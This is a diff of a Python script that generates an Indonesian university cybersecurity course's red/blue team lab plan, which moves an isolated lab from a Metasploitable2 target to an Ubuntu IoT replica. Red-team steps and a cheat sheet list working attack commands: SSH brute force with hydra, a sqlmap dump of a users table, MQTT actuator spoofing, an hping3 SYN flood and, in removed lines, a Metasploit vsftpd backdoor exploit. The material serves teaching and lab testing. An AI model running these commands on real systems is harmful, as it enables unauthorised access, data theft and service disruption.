@@ -204,7 +204,7 @@ table(
         ['Mata kuliah', 'TEK1314 Keamanan Siber — D4 Teknologi Rekayasa Komputer, SV IPB'],
         ['Kelas / Kelompok', 'TEK-A / Kelompok 4'],
         ['Subnet lab', '192.168.4.0/24 (isolated lab, tanpa koneksi internet)'],
-        ['Target Node replika', '192.168.4.5 — Metasploitable2'],
+        ['Target Node replika', '192.168.4.5 — Ubuntu Server LTS 26.04'],
         ['Attacker Node', '192.168.4.100 — Kali Linux'],
         ['Monitoring Node', '192.168.4.200 — Security Onion 3.2'],
         ['Repositori', 'github.com/anggi267/TEK1314-2026-Kel04-KelasA'],
@@ -236,7 +236,7 @@ table(
     ['Minggu', 'Fase', 'Fokus', 'Deliverable wajib', 'PIC utama'],
     [
         ['1', 'F1', 'Pembentukan tim & peran, aturan kerja', 'Repo + pembagian role', 'Lead'],
-        ['2', 'F1', 'Instalasi CyberOps Workstation & Security Onion', 'VM hidup, screenshot instalasi', 'Blue'],
+        ['2', 'F1', 'Instalasi CyberOps Workstation & Security Onion (CyberOps = alat praktikum, bukan node topologi)', 'VM hidup, screenshot instalasi', 'Blue'],
         ['3', 'F1', 'Hardening & audit dasar Linux', 'Catatan praktikum, hardening awal', 'Blue'],
         ['4', 'F1', 'Perancangan arsitektur & skema IP', 'docs/design/topology.png, ip_plan.md', 'Blue + Lead'],
         ['5–6', 'F1', 'Praktikum jaringan: routing, Wireshark, ACL', 'Laporan praktikum 4–6', 'Red + Blue'],
@@ -277,7 +277,7 @@ doc.add_heading('2.2 Blue Team — Anggi Permana Putra', level=2)
 table(
     ['#', 'Langkah', 'Keluaran / cara verifikasi'],
     [
-        ['B1', 'Instal CyberOps Workstation (OVA) dan Security Onion (ISO 3.2.0) di laptop masing-masing / laptop utama.', 'VM boot, login berhasil (docs/Pertemuan 2)'],
+        ['B1', 'Instal CyberOps Workstation (OVA) dan Security Onion (ISO 3.2.0). CyberOps hanya untuk praktikum Linux Minggu 3 — tidak dipakai di topologi PBL.', 'VM boot, login berhasil (docs/Pertemuan 2)'],
         ['B2', 'Set IP statis tiap node sesuai ip_plan (target .5, attacker .100, monitoring .200); uji ping antar node.', 'Ping berhasil dua arah'],
         ['B3', 'Verifikasi sensor melihat trafik: buat ping dari Kali ke target, cek Zeek conn.log / tcpdump di Onion.', 'Screenshot conn.log berisi pasangan IP'],
         ['B4', 'Hardening awal di target: ganti password default, aktifkan firewall dasar bila tersedia, matikan service yang jelas tidak perlu.', 'Catatan perubahan + screenshot config'],
@@ -291,7 +291,7 @@ table(
     ['#', 'Langkah', 'Keluaran / cara verifikasi'],
     [
         ['R1', 'Riset port & service yang berpotensi dieksploitasi pada target (21, 22, 23, 80, 3306, 445, 8180).', 'Daftar port + alasan, dari hasil scan terkontrol'],
-        ['R2', 'Petakan versi service ke CVE publik (vsftpd 2.3.4, MySQL 5.0.51a, Samba 3.0.20, Apache 2.2.8).', 'Tabel service → CVE → dampak'],
+        ['R2', 'Petakan layanan replika ke kelemahan yang disengaja (kredensial lemah, SQLi api.php, MQTT anonymous).', 'Tabel layanan → kelemahan → skenario'],
         ['R3', 'Serahkan daftar port & catatan celah ke Blue Team sebagai masukan desain topologi (tugas role Minggu 4).', 'Komentar/commit yang merujuk daftar tersebut'],
         ['R4', 'Siapkan Kali: nmap, metasploit, hydra, sqlmap, hping3, mosquitto-clients.', 'Output "which" semua tool'],
         ['R5', 'Uji konektivitas lab: ping & nmap -sn (bukan scan penuh) untuk memastikan jalur siap.', 'Hasil ping/scan ringan'],
@@ -335,29 +335,30 @@ table(
     ['#', 'Langkah', 'Perintah / detail', 'Bukti wajib'],
     [
         ['B1', 'Snapshot VM target sebelum perubahan apa pun.', 'VirtualBox/VMware → Snapshot, nama snap-s1-<tanggal>', 'screenshot nama snapshot'],
-        ['B2', 'Pastikan target & sensor hidup, IP sesuai ip_plan.', 'ping 192.168.4.5 dari Kali & Onion', 'screenshot ping'],
+        ['B2', 'Pastikan NIC sudah di Internal Network pbl-kel4 dan IP guest sesuai ip_plan.', 'ip -brief a di tiap VM; ping 192.168.4.5 dari Kali dan dari Onion; nmap -sn 192.168.4.0/24', 'screenshot ip a + ping'],
         ['B3', 'Rekam baseline normal 15 menit (tanpa serangan).', 'ping -i 5, 10x buka dashboard, query API tiap 10 s, tcpdump di sensor', 'baseline_minggu9.pcap + baseline_summary.md'],
         ['B4', 'Jalankan perekam baseline otomatis.', 'sudo bash scripts/blueteam/01_rekam_baseline.sh', 'evidence/before/00–07'],
-        ['B5', 'A-2: pasang SSH key, uji login key DULU sebelum mematikan password.', 'ssh-copy-id -i ~/.ssh/pbl_kel4.pub msfadmin@192.168.4.5 lalu login pakai -i', 'A2_after_key_login_ok.png'],
+        ['B5', 'A-2: pasang SSH key, uji login key DULU sebelum mematikan password.', 'ssh-copy-id -i ~/.ssh/pbl_kel4.pub iotadmin@192.168.4.5 lalu login pakai -i', 'A2_after_key_login_ok.png'],
         ['B6', 'A-2: matikan PasswordAuthentication; jangan tutup sesi SSH lama.', 'sed -i + /etc/init.d/ssh restart', 'A2_after_password_login_denied.png'],
         ['B7', 'A-3 (opsional): ganti port 22 → 2222.', 'sed -i s/^#*Port.*/Port 2222/', 'A3_after_ssh_port2222_nmap.png'],
         ['B8', 'B-2: siapkan semua rule ufw SEBELUM enable (2222 wajib allow).', 'ufw default deny incoming; ufw allow 2222/tcp; ufw allow 80/tcp; ufw --force enable', 'B2_after_ufw_status.png'],
         ['B9', 'Uji dari Kali: SSH masih bisa, port lain tertutup.', 'nmap -sS -p1-1024 192.168.4.5', 'B2_before_nmap_vs_after_nmap.png'],
         ['B10', 'B-1: matikan service tak terpakai (telnet, rsh, tftp, smtp, ircd, distccd, tomcat).', 'killall/update-rc.d -f remove sesuai checklist', 'B1_after_nmap_full.txt'],
-        ['B11', 'B-3: patch paket + ganti password root MySQL; JANGAN lupa update config DVWA.', 'mysqladmin -u root password; edit config/config.inc.php DVWA', 'B3_after_mysql_access_denied.png + dashboard masih hidup'],
+        ['B11', 'B-3: patch paket + hapus kredensial lemah/default.', 'apt upgrade; mysql_secure_installation; passwd iotadmin; apt list --upgradable', 'B3_after_apt_upgraded.txt + B3_after_mysql_secure.png'],
         ['B12', 'C-1: pindahkan kredensial aplikasi ke .env (chmod 600).', 'lihat checklist C-1', 'C1_after_env_file_chmod600.png'],
         ['B13', 'Rekam kondisi after, update status checklist, commit.', 'sudo bash scripts/blueteam/02_rekam_after.sh', 'commit "feat(blueteam): baseline + 5 hardening controls"'],
     ],
     widths=[1.0, 4.7, 6.4, 4.9], font=8.0)
 
-callout('Pitfall yang paling sering menghabiskan waktu: (1) Metasploitable2 memakai Ubuntu 8.04 '
-        'yang repositori apt-nya sudah EOL — "apt-get install ufw/fail2ban" bisa gagal. Bila gagal, '
-        'ganti dengan iptables (default-deny + rate-limit) dan tulis jujur di checklist bahwa '
-        'kontrolnya diimplementasikan dengan iptables, bukan ufw/fail2ban. (2) Mengganti password '
-        'root MySQL tanpa memperbarui config DVWA akan mematikan dashboard — dan itu merusak '
-        'skenario RT-03.', fill='FDECEC', border='9B2226')
+callout('Pitfall yang paling sering menghabiskan waktu: (1) VM target saat ini berisi Ubuntu 25.04 '
+        'yang sudah EOL — pasang ulang ke 26.04 LTS dulu, kalau tidak "apt upgrade" untuk B-3 akan '
+        'gagal. (2) Jangan aktifkan ufw sebelum port SSH 2222 diizinkan, dan jangan matikan password '
+        'auth sebelum login pakai key terbukti berhasil — dua hal ini yang paling sering membuat '
+        'kelompok terkunci dari VM sendiri. (3) Saat mengaktifkan ACL Mosquitto, uji ulang dashboard: '
+        'user yang salah di ACL akan mematikan dashboard dan menghapus sasaran RT-03.',
+        fill='FDECEC', border='9B2226')
 
-para('Contoh pengganti ufw/fail2ban bila apt EOL (jalankan sebagai root):', size=9, bold=True, space_after=2)
+para('Contoh aturan iptables bila ufw tidak tersedia (opsional, jarang perlu di Ubuntu):', size=9, bold=True, space_after=2)
 for cmd in [
     'iptables -F; iptables -P INPUT DROP; iptables -P FORWARD DROP',
     'iptables -A INPUT -i lo -j ACCEPT',
@@ -382,7 +383,7 @@ table(
         ['B14', 'Tahap 2 — deteksi: saring log pada rentang waktu serangan.', 'Security Onion → Hunt → event.dataset:conn and source.ip:192.168.4.100 (tambahkan destination.ip:192.168.4.5)', 'screenshot alert/log'],
         ['B15', 'Jika TIDAK ada alert, catat sebagai temuan (bukan kegagalan).', 'Tulis query yang dicoba + hasil kosong di <id>_no_alert.md', 'file <id>_no_alert.md'],
         ['B16', 'Tahap 3 — analisis: jelaskan mengapa berhasil/gagal, kontrol mana yang kurang.', 'Isi kolom analisis di docs/purple-team-log.md (root cause, bukan gejala)', 'baris log terisi'],
-        ['B17', 'Tahap 4 — respons: tambahkan kontrol penutup sesuai tabel Bagian 7 attack plan.', 'Mis. RT-02 → matikan FTP (B-1) + blokir 21 (B-2) + upgrade vsftpd (B-3)', 'diff config sebelum/sesudah'],
+        ['B17', 'Tahap 4 — respons: tambahkan kontrol penutup sesuai tabel Bagian 7 attack plan.', 'Mis. RT-02 → A-2 key-only + A-4 fail2ban + B-3 password kuat + A-1 no-root', 'diff config sebelum/sesudah'],
         ['B18', 'Commit perubahan sebelum Red menguji ulang.', 'git commit -m "feat(blueteam): block FTP after RT-02"', 'hash commit'],
         ['B19', 'Tahap 5 — konfirmasi: minta Red mengulang skenario yang sama, lalu cocokkan hasil.', 'Serangan harus gagal/terblokir + alert tetap muncul', 'screenshot percobaan ulang gagal'],
         ['B20', 'RT-04 khusus: buat rule alert MQTT kustom (tidak ada signature bawaan).', 'Alert bila CONNECT/PUBLISH ke aktuator/# dari IP selain gateway 192.168.4.100', 'rule + screenshot alert menyala'],
@@ -413,10 +414,10 @@ table(
         ['R6', 'Siapkan folder bukti rt01–rt05 + cek tools.', 'mkdir -p docs/redteam/evidence/rt0{1..5}; which nmap msfconsole sqlmap hydra hping3 mosquitto_pub', 'screenshot which'],
         ['R7', 'RT-01 recon: full TCP + service/OS fingerprint.', 'nmap -sS -p- -T4 --min-rate 1000 192.168.4.5 -oA rt01_fulltcp', 'rt01_fulltcp.nmap/.xml/.gnmap'],
         ['R8', 'Kirim jam mulai/selesai serangan ke Blue (wajib).', 'catat timestamp: date -Is', 'rt01_command.txt'],
-        ['R9', 'RT-02 eksploit vsftpd 2.3.4 (CVE-2011-2523).', 'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.4.5; run"', 'rt02_msf_console.txt + id = uid=0'],
-        ['R10', 'RT-02 fallback bila backdoor sudah ditutup: default credential.', 'hydra -l msfadmin -P rockyou.txt ssh://192.168.4.5 -s 2222 -t 4 -f', 'rt02_hydra.txt'],
+        ['R9', 'RT-02 brute-force SSH (kredensial lemah, kelemahan disengaja #1).', 'hydra -l iotadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f -V', 'rt02_hydra_baseline.txt'],
+        ['R10', 'RT-02 ukur dampak setelah berhasil login.', 'ssh iotadmin@192.168.4.5; id; sudo -l; mysql -u iotadmin -p iot_db', 'rt02_dampak.txt (sudo -l penuh)'],
         ['R11', 'RT-03 SQLi: login DVWA dulu, set security=low, ambil cookie sesi.', 'browser/curl → salin PHPSESSID', 'screenshot sesi'],
-        ['R12', 'RT-03 eksekusi sqlmap.', 'sqlmap -u "http://192.168.4.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dbs --dump -T users', 'rt03_sqlmap.txt'],
+        ['R12', 'RT-03 eksekusi sqlmap.', 'sqlmap -u "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=...; security=low" --batch --dbs --dump -T users', 'rt03_sqlmap.txt'],
         ['R13', 'RT-04 MQTT spoof publish (kondisional).', 'mosquitto_sub -h 192.168.4.5 -t "#" -v ; mosquitto_pub -h 192.168.4.5 -t aktuator/pompa -m \'{"cmd":"ON"}\'', 'rt04_pub.txt'],
         ['R14', 'RT-05 SYN flood terkontrol 60 detik.', 'sudo timeout 60 hping3 -S --flood -p 80 192.168.4.5', 'rt05_hping3.txt + curl latency'],
         ['R15', 'Tahap 5: ulangi tiap skenario SETELAH mitigasi Blue.', 'perintah sama, output disimpan dengan akhiran _after', 'rt0X_*_after.txt'],
@@ -503,7 +504,7 @@ doc.add_heading('5. Matriks Artefak, PIC, dan Waktu Commit', level=1)
 table(
     ['Artefak', 'PIC', 'Batas waktu', 'Kriteria yang dilayani'],
     [
-        ['docs/design/topology.png, ip_plan.md', 'Blue + Lead', 'Minggu 4 (selesai)', 'Arsitektur 20%'],
+        ['docs/design/topology-v2.png, ip_plan.md', 'Blue + Lead', 'Minggu 4 + revisi Minggu 9', 'Arsitektur 20%'],
         ['docs/presentation-minggu9/slides.pdf', 'Lead', 'sebelum sesi Minggu 9', 'Semua kriteria'],
         ['docs/presentation-minggu9/tech_stack_declaration.md', 'Lead + Blue', 'Minggu 9', 'Pemetaan tech stack 20%'],
         ['docs/blueteam/hardening_checklist.md + evidence/', 'Blue', 'Minggu 9 (rencana) → 10–11 (bukti)', 'Hardening 30%'],
@@ -522,7 +523,7 @@ table(
     ['Risiko', 'Dampak', 'Penanganan'],
     [
         ['Terkunci dari VM sendiri setelah mengubah port/firewall', 'Sesi habis, hardening gagal', 'Snapshot dulu; siapkan rule sebelum enable; jangan tutup sesi SSH lama'],
-        ['Repositori apt Metasploitable2 (Ubuntu 8.04) sudah EOL', 'ufw/fail2ban/mosquitto gagal dipasang', 'Pakai iptables + rate-limit; dokumentasikan penggantian kontrol secara jujur'],
+        ['VM target masih Ubuntu 25.04 (EOL)', 'apt upgrade gagal → kontrol B-3 tidak terbukti', 'Pasang ulang ke 26.04 LTS sebelum sesi S1'],
         ['Ganti password root MySQL mematikan DVWA', 'Skenario RT-03 tidak bisa dijalankan', 'Perbarui config/config.inc.php DVWA sebelum lanjut'],
         ['MQTT broker tidak bisa dipasang', 'RT-04 tidak dapat dieksekusi', 'Tandai kondisional; ganti dengan uji HTTP REST tanpa autentikasi, atau tambah VM Ubuntu kedua'],
         ['RAM laptop tidak cukup untuk 3 VM', 'Sesi terbuang untuk troubleshooting', 'Jadwalkan Onion bergantian; matikan desktop environment; tambah RAM/SSD'],
@@ -550,7 +551,7 @@ bullets([
     [('"Hardening-nya sudah jalan atau baru rencana?" ', {'bold': True}),
      ('→ sebut status apa adanya + tunjukkan file bukti yang ada; jangan mengklaim yang belum dieksekusi.', {})],
     [('"Kenapa serangannya itu, bukan yang lain?" ', {'bold': True}),
-     ('→ kaitkan ke celah nyata hasil riset Minggu 4 (vsftpd 2.3.4, MySQL root kosong, DVWA SQLi) dan ke dampak bisnis.', {})],
+     ('→ kaitkan ke kelemahan yang sengaja dipasang (kredensial lemah iotadmin, SQLi api.php, MQTT anonymous) dan ke dampak bisnis.', {})],
     [('"Bagaimana kalian tahu mitigasinya berhasil?" ', {'bold': True}),
      ('→ tunjukkan Tahap 5: perintah yang sama diulang, gagal, alert tetap muncul, plus diff config.', {})],
     [('"Apa yang tidak kalian sempat kerjakan?" ', {'bold': True}),
@@ -562,7 +563,7 @@ doc.add_heading('8. Lampiran — Cheat Sheet Perintah per Role', level=1)
 
 doc.add_heading('8.1 Blue Team (di VM target 192.168.4.5)', level=3)
 for line in [
-    'ssh -i ~/.ssh/pbl_kel4 -p 2222 msfadmin@192.168.4.5      # login setelah hardening',
+    'ssh -i ~/.ssh/pbl_kel4 -p 2222 iotadmin@192.168.4.5      # login setelah hardening',
     'sudo netstat -tulpn | grep LISTEN                        # port terbuka',
     'sudo iptables -L -n -v                                    # aturan firewall aktif',
     'sudo grep "Failed password" /var/log/auth.log | tail     # percobaan login',
@@ -576,10 +577,10 @@ for line in [
 doc.add_heading('8.2 Red Team (di Kali 192.168.4.100)', level=3)
 for line in [
     'nmap -sS -p- -T4 --min-rate 1000 192.168.4.5 -oA rt01      # recon',
-    'msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.4.5; run"',
-    'sqlmap -u "http://192.168.4.5/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \\',
+    'hydra -l iotadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.4.5 -t 4 -f',
+    'sqlmap -u "http://192.168.4.5/iot-dashboard/vulnerabilities/sqli/?id=1&Submit=Submit" \\',
     '       --cookie="PHPSESSID=<sesi>; security=low" --batch --dumps',
-    'hydra -l msfadmin -P rockyou.txt ssh://192.168.4.5 -s 2222 -t 4 -f',
+    'hydra -l iotadmin -P rockyou.txt ssh://192.168.4.5 -s 2222 -t 4 -f',
     'mosquitto_pub -h 192.168.4.5 -t aktuator/pompa -m \'{"cmd":"ON"}\'',
     'sudo timeout 60 hping3 -S --flood -p 80 192.168.4.5',
 ]:
